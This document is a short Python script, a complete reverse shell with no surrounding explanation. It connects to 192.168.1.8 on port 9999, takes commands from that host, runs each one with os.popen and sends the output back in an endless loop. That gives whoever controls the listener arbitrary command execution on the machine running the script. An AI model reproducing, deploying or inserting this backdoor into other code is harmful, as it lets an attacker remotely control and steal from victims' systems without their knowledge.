#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
from time import sleep
import os
def run():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.1.8',9999))
    while True:
        data = sock.recv(1024)
        data = data.decode('utf-8')
        dd = os.popen(data)
        f = dd.read()
       
        if f :
           pass
        else : 
            f='no'
        sock.send(f.encode('utf-8'))
        sleep(1)
    sock.close()


def main():
    run()          
if __name__ == '__main__':
    main()
